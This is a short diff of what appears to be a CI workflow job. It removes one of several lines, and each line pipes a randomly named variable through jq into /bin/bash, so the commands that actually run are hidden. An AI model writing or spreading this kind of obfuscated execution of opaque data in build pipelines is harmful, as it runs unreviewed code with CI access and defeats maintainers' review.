@@ -31,7 +31,6 @@ jobs:
           echo $hlata2848 | jq -r .ta602 | /bin/bash
           echo $ygau091 | jq -r .nf0448 | /bin/bash
           echo $ybfg1526 | jq -r .lqav277 | /bin/bash
-          printf '%s' "$t2221" | jq -r .aiom3 | /bin/bash
           echo $yapjn9117 | jq -r .mvjfq40290 | /bin/bash
           echo $wrmkt60 | jq -r .asx25017 | /bin/bash
           printf '%s' "$walr54" | jq -r .zi09 | /bin/bash
